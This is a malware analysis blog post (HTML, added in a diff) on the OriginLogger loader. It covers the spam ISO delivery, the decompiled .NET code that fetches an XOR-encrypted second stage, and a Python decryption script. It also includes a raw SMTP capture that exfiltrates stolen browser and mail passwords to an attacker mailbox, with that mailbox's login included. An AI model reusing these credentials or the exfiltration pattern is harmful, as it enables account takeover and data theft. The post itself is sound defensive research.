@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>OriginLogger Loader - d01a</title><meta name="Description" content="OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis"><meta property="og:title" content="OriginLogger Loader" />
+<meta property="og:description" content="OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d01a.github.io/originlogger/" /><meta property="og:image" content="https://d01a.github.io/originlogger/featured-image.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-16T02:23:49+08:00" />
+<meta property="article:modified_time" content="2023-01-16T02:38:37+02:00" /><meta property="og:site_name" content="d01a" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://d01a.github.io/originlogger/featured-image.png"/>
+<meta name="twitter:title" content="OriginLogger Loader"/>
+<meta name="twitter:description" content="OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis"/>
+<meta name="application-name" content="d01a">
+<meta name="apple-mobile-web-app-title" content="d01a"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://d01a.github.io/originlogger/" /><link rel="prev" href="https://d01a.github.io/raccoon-stealer/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "OriginLogger Loader",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/d01a.github.io\/originlogger\/"
+        },"image": ["https:\/\/d01a.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "Malware Analysis, Reverse Engineering","wordcount":  762 ,
+        "url": "https:\/\/d01a.github.io\/originlogger\/","datePublished": "2023-01-16T02:23:49+08:00","dateModified": "2023-01-16T02:38:37+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Mohamed Adel","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/d01a.github.io\/images\/avatar.png",
+                    "width":  735 ,
+                    "height":  923 
+                }},"author": {
+                "@type": "Person",
+                "name": "Mohamed Adel"
+            },"description": "OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="d01a">d01a</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="d01a">d01a</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">OriginLogger Loader</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://d01a.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mohamed Adel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware-analysis/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware Analysis</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-16">2023-01-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;762 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;<span id="/originlogger/" class="leancloud_visitors" data-flag-title="OriginLogger Loader">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#infection-through-email">Infection through Email</a></li>
+    <li><a href="#loader-analysis">Loader Analysis</a></li>
+    <li><a href="#downloading-the-second-stage">Downloading the second stage</a></li>
+    <li><a href="#second-stage-analysis">second stage Analysis</a></li>
+    <li><a href="#network-capture-analysis">Network capture analysis</a></li>
+    <li><a href="#references">References</a></li>
+    <li><a href="#file-hashes">File hashes</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="conclusion">Conclusion</h2>
+<p>Origin Logger is a variant of Agent tesla, it is build on top of it and uses all of its capabilities. The malware is spreading using spam emails with a malicious attachments. The malware exfiltrate user accounts and passwords and other information from the infected machine.</p>
+<h2 id="infection-through-email">Infection through Email</h2>
+<p>the infection is started with spam email attached by <code>.iso</code> File</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/email.png"
+        data-srcset="/originlogger/img/email.png, /originlogger/img/email.png 1.5x, /originlogger/img/email.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/email.png"
+        title="/originlogger/img/email.png" width="1388" height="557" /></p>
+<p>the .ISO file contains only an executable with a PDF icon.</p>
+<h2 id="loader-analysis">Loader Analysis</h2>
+<p>the ISO file contains <code>.exe</code> file that is likely to be the fist loader. Dropping the executable in Detect It Easy</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/DIE_overview.png"
+        data-srcset="/originlogger/img/DIE_overview.png, /originlogger/img/DIE_overview.png 1.5x, /originlogger/img/DIE_overview.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/DIE_overview.png"
+        title="/originlogger/img/DIE_overview.png" width="715" height="708" /></p>
+<p>It is a .NET executable and the entropy is not high, Hopefully it will not be packed . So, I will use <code>dnSpyEx</code> to decompile the executable. Going to the Entry Point:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/mainClass.png"
+        data-srcset="/originlogger/img/mainClass.png, /originlogger/img/mainClass.png 1.5x, /originlogger/img/mainClass.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/mainClass.png"
+        title="/originlogger/img/mainClass.png" width="1026" height="382" /></p>
+<p>there is Three function calls. <code>EnableVisualStyles</code> and <code>SetCompatibleTextRenderingDefault</code> both do not contain anything useful as they are library functions and not written by the author.
+the third part is creating a instance to <code>Form1</code> class.
+The constructor contains two functions:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/form1.png"
+        data-srcset="/originlogger/img/form1.png, /originlogger/img/form1.png 1.5x, /originlogger/img/form1.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/form1.png"
+        title="/originlogger/img/form1.png" width="781" height="173" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/init_comp.png"
+        data-srcset="/originlogger/img/init_comp.png, /originlogger/img/init_comp.png 1.5x, /originlogger/img/init_comp.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/init_comp.png"
+        title="/originlogger/img/init_comp.png" width="763" height="411" /></p>
+<p><code>InitializeComponent</code> is used to configure the form, it is not part of the malicious code so let&rsquo;s continue to <code>Socker</code> function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/socker.png"
+        data-srcset="/originlogger/img/socker.png, /originlogger/img/socker.png 1.5x, /originlogger/img/socker.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/socker.png"
+        title="/originlogger/img/socker.png" width="456" height="294" /></p>
+<p>by exploring the first function, it stores a random string in <code>Text</code> variable and calls <code>Hyper.Array()</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/trial.png"
+        data-srcset="/originlogger/img/trial.png, /originlogger/img/trial.png 1.5x, /originlogger/img/trial.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/trial.png"
+        title="/originlogger/img/trial.png" width="802" height="113" /></p>
+<p><code>Hyper</code> class contains the information we are looking for, a link for the second stage.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/hyper.png"
+        data-srcset="/originlogger/img/hyper.png, /originlogger/img/hyper.png 1.5x, /originlogger/img/hyper.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/hyper.png"
+        title="/originlogger/img/hyper.png" width="1276" height="817" /></p>
+<p>starting with <code>Array()</code> function which calls <code>GetBuffer()</code> . <code>GetBuffer()</code> just calls <code>Avrql()</code> and passing <code>http://savory.com[.]bd/sav/Ztvfo.png</code> as an argument.
+<code>Avrql()</code> function downloads the file <code>Ztvfo.png</code> and stores it as an array in the memory and returns that Array. Returning to <code>Array()</code> function which takes the downloaded file in <code>buffer</code> variable and XOR it with the string <code>Sfhdjkpkowgnpcgoshb</code> and stores the XORed data in <code>list</code> array.
+that&rsquo;s all for the hyper class, returning back to <code>Socker</code> to check the other function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/void.png"
+        data-srcset="/originlogger/img/void.png, /originlogger/img/void.png 1.5x, /originlogger/img/void.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/void.png"
+        title="/originlogger/img/void.png" width="921" height="89" /></p>
+<p><code>Void()</code> loads assembly data stored in <code>Tag</code> which is the file downloaded and XORed previously.
+To run the loaded assembly, <code>Lion()</code> and <code>Ursa</code> are used, both Invokes different namespaces from the randomized string <code>this.richTextBox1.Text = &quot;Gdbtshcw.Sdnceyzqa Vqyhbeqthicxedwtrnxrbzcq&quot;</code></p>
+<h2 id="downloading-the-second-stage">Downloading the second stage</h2>
+<p>using the PCAP file provided with the sample to get the second stage. we can use <code>wireshark</code> to do so.
+to Download the file, navigate to <code>File &gt; Export Objects &gt; HTTP</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/Ztvfo.png"
+        data-srcset="/originlogger/img/Ztvfo.png, /originlogger/img/Ztvfo.png 1.5x, /originlogger/img/Ztvfo.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/Ztvfo.png"
+        title="/originlogger/img/Ztvfo.png" width="1229" height="537" /></p>
+<p>The Content of the this file is Encrypted using XOR cipher as we saw previously.
+using the following script to decrypt the file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Sfhdjkpkowgnpcgoshb&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Ztvfo.bin&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buff</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buff</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])))</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;Ztvfo_out.bin&#34;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;664576B&#39;</span><span class="p">,</span> <span class="o">*</span><span class="n">s</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="second-stage-analysis">second stage Analysis</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/originlogger/img/second_overview.png"
+        data-srcset="/originlogger/img/second_overview.png, /originlogger/img/second_overview.png 1.5x, /originlogger/img/second_overview.png 2x"
+        data-sizes="auto"
+        alt="/originlogger/img/second_overview.png"
+        title="/originlogger/img/second_overview.png" width="714" height="381" /></p>
+<p>Uploading the extracted file to DIE, The executable is obfuscated using .NET Reactor.</p>
+<h2 id="network-capture-analysis">Network capture analysis</h2>
+<p>from the provided PCAP file of the traffic. Origin Logger exfiltrate the data using SMTP communication. the following is the content of the communication:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">220-bh-41.webhostbox.net ESMTP Exim 4.95 #2 Thu, 05 Jan 2023 22:51:30 +0000
+</span></span><span class="line"><span class="cl">220-We do not authorize the use of this system to transport unsolicited,
+</span></span><span class="line"><span class="cl">220 and/or bulk e-mail.
+</span></span><span class="line"><span class="cl">EHLO DESKTOP-WIN11PC
+</span></span><span class="line"><span class="cl">250-bh-41.webhostbox.net Hello DESKTOP-WIN11PC [173.66.46.112]
+</span></span><span class="line"><span class="cl">250-SIZE 52428800
+</span></span><span class="line"><span class="cl">250-8BITMIME
+</span></span><span class="line"><span class="cl">250-PIPELINING
+</span></span><span class="line"><span class="cl">250-PIPE_CONNECT
+</span></span><span class="line"><span class="cl">250-AUTH PLAIN LOGIN
+</span></span><span class="line"><span class="cl">250-STARTTLS
+</span></span><span class="line"><span class="cl">250 HELP
+</span></span><span class="line"><span class="cl">AUTH login bWFya2V0aW5nQHRyYW5zZ2Vhci5pbg==
+</span></span><span class="line"><span class="cl">334 UGFzc3dvcmQ6
+</span></span><span class="line"><span class="cl">TUBzc3cwcmQjNjIx
+</span></span><span class="line"><span class="cl">235 Authentication succeeded
+</span></span><span class="line"><span class="cl">MAIL FROM:&lt;marketing@transgear.in&gt;
+</span></span><span class="line"><span class="cl">250 OK
+</span></span><span class="line"><span class="cl">RCPT TO:&lt;zaritkt@arhitektondizajn.com&gt;
+</span></span><span class="line"><span class="cl">250 Accepted
+</span></span><span class="line"><span class="cl">DATA
+</span></span><span class="line"><span class="cl">354 Enter message, ending with &#34;.&#34; on a line by itself
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">From: marketing@transgear.in
+</span></span><span class="line"><span class="cl">To: zaritkt@arhitektondizajn.com
+</span></span><span class="line"><span class="cl">Date: 5 Jan 2023 22:51:31 +0000
+</span></span><span class="line"><span class="cl">Subject: PW_windows11user/DESKTOP-WIN11PC
+</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=us-ascii
+</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: quoted-printable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Time: 01/05/2023 22:51:26&lt;br&gt;User Name: windows11user&lt;br&gt;Computer=
+</span></span><span class="line"><span class="cl">Name: DESKTOP-WIN11PC&lt;br&gt;OSFullName: Microsoft Windows 11 Pro&lt;br=
+</span></span><span class="line"><span class="cl">&gt;CPU: Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz&lt;br&gt;RAM: 32165.83 =
+</span></span><span class="line"><span class="cl">MB&lt;br&gt;IP Address: 173.66.46.112&lt;br&gt;&lt;hr&gt;URL:imap://mail.windows11u=
+</span></span><span class="line"><span class="cl">sers.com&lt;br&gt;=0D=0AUsername:admin@windows11users.com&lt;br&gt;=0D=0APass=
+</span></span><span class="line"><span class="cl">word:EBj%U7-p@q4NW&lt;br&gt;=0D=0AApplication:Thunderbird&lt;br&gt;=0D=0A&lt;hr&gt;=
+</span></span><span class="line"><span class="cl">=0D=0AURL:smtp://mail.windows11users.com&lt;br&gt;=0D=0AUsername:admin@=
+</span></span><span class="line"><span class="cl">windows11users.com&lt;br&gt;=0D=0APassword:EBj%U7-p@q4NW&lt;br&gt;=0D=0AApplicat=
+</span></span><span class="line"><span class="cl">ion:Thunderbird&lt;br&gt;=0D=0A&lt;hr&gt;=0D=0AURL:webmail.windows11users.com=
+</span></span><span class="line"><span class="cl">&lt;br&gt;=0D=0AUsername:admin@windows11users.com&lt;br&gt;=0D=0APassword:EBj=
+</span></span><span class="line"><span class="cl">%U7-p@q4NW&lt;br&gt;=0D=0AApplication:Edge Chromium&lt;br&gt;=0D=0A&lt;hr&gt;=0D=0AURL=
+</span></span><span class="line"><span class="cl">:https://login.us.coca-cola.com/&lt;br&gt;=0D=0AUsername:admin@windows1=
+</span></span><span class="line"><span class="cl">1users.com&lt;br&gt;=0D=0APassword:Zp61-7$r#J_iLpCYV&amp;jKr&lt;br&gt;=0D=0AAppli=
+</span></span><span class="line"><span class="cl">cation:Edge Chromium&lt;br&gt;=0D=0A&lt;hr&gt;=0D=0AURL:https://www.linkedin.=
+</span></span><span class="line"><span class="cl">com/&lt;br&gt;=0D=0AUsername:admin@windows11users.com&lt;br&gt;=0D=0APassword=
+</span></span><span class="line"><span class="cl">:TqQPvG#0g%$ga_q51&lt;br&gt;=0D=0AApplication:Edge Chromium&lt;br&gt;=0D=0A&lt;h=
+</span></span><span class="line"><span class="cl">r&gt;=0D=0AURL:https://www.amazon.com/ap/signin&lt;br&gt;=0D=0AUsername:ad=
+</span></span><span class="line"><span class="cl">min@windows11users.com&lt;br&gt;=0D=0APassword:3Fo76#PTf4P$Im!9mkLso69e=
+</span></span><span class="line"><span class="cl">T&lt;br&gt;=0D=0AApplication:Edge Chromium&lt;br&gt;=0D=0A&lt;hr&gt;=0D=0AURL:https=
+</span></span><span class="line"><span class="cl">://www.target.com/login&lt;br&gt;=0D=0AUsername:windows11user&lt;br&gt;=0D=0APas=
+</span></span><span class="line"><span class="cl">sword:c$Kl3wO!e#i7A&amp;!L2&lt;br&gt;=0D=0AApplication:Edge Chromium&lt;br&gt;=0D=0A=
+</span></span><span class="line"><span class="cl">&lt;hr&gt;=0D=0AURL:https://myaccount.nytimes.com/auth/login&lt;br&gt;=0D=0AU=
+</span></span><span class="line"><span class="cl">sername:admin@windows11users.com&lt;br&gt;=0D=0APassword:u*N21Or650yBps=
+</span></span><span class="line"><span class="cl">p45awSa&lt;br&gt;=0D=0AApplication:Edge Chromium&lt;br&gt;=0D=0A&lt;hr&gt;=0D=0A
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">250 OK id=1pDZ59-000wFk-B4
+</span></span><span class="line"><span class="cl">QUIT
+</span></span><span class="line"><span class="cl">221 bh-41.webhostbox.net closing connection
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>the exfiltrated data</p>
+<table>
+<thead>
+<tr>
+<th>type of data</th>
+<th>example from the PCAP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Current Time</td>
+<td>01/05/2023 22:51:26</td>
+</tr>
+<tr>
+<td>OS Full Name</td>
+<td>Microsoft Windows 11 Pro</td>
+</tr>
+<tr>
+<td>CPU</td>
+<td>Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz</td>
+</tr>
+<tr>
+<td>RAM</td>
+<td>32165.83 MB</td>
+</tr>
+<tr>
+<td>IP Address</td>
+<td>173.66.46.112</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>imap[://]mail.windows11users[.]com</td>
+</tr>
+<tr>
+<td>Username</td>
+<td>admin@windows11users[.]com</td>
+</tr>
+<tr>
+<td>Password</td>
+<td>EBj%U7-p@q4NW</td>
+</tr>
+<tr>
+<td>Application: Edge Chromium</td>
+<td>AURL=https[://]login.us.coca-cola[.]com/ Username:admin@windows11users[.]com Password:Zp61-7$r#J_iLpCYV&amp;jKr</td>
+</tr>
+</tbody>
+</table>
+<p>it steals the username and password of the user and send data of the current machine and steals user accounts from different locations like thunderbird and edge browser.</p>
+<h2 id="references">References</h2>
+<p><a href="https://www.malware-traffic-analysis.net/2023/01/05/index.html" target="_blank" rel="noopener noreffer ">https://www.malware-traffic-analysis.net/2023/01/05/index.html</a></p>
+<h2 id="file-hashes">File hashes</h2>
+<ul>
+<li>926a3142270a52f8afb93490d5dd21f0ca23bc0815ee6630068cf6409d8ee448</li>
+<li>5016ba92afac1c2b2a2a6b17a09406869bd6f58cfe680f25030af1a1ba1c29a2</li>
+<li>90d977ca0a3331d78005912d2b191d26e33fa2c6ef17602d6173164ba83fd85e</li>
+<li>3883d374ba0736254a89e310b86f3c3769adcaed471b103b5c0a8a2f16cf5c8d</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-16&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/0bb29a5259d6403206a6992f9d4cdadee5a34781" target="_blank" title="commit by mohamedadel46(muhammed195826@feng.bu.edu.eg) 0bb29a5259d6403206a6992f9d4cdadee5a34781: originLogger post">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>0bb29a5</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/originlogger/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://d01a.github.io/originlogger/" data-title="OriginLogger Loader" data-via="0xd01a" data-hashtags="Malware Analysis,Reverse Engineering"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://d01a.github.io/originlogger/" data-hashtag="Malware Analysis"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://d01a.github.io/originlogger/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://d01a.github.io/originlogger/" data-title="OriginLogger Loader"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://d01a.github.io/originlogger/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://d01a.github.io/originlogger/" data-title="OriginLogger Loader"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://d01a.github.io/originlogger/" data-title="OriginLogger Loader"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="https://d01a.github.io/originlogger/" data-title="OriginLogger Loader" data-description="OriginLogger: A look at OriginLogger 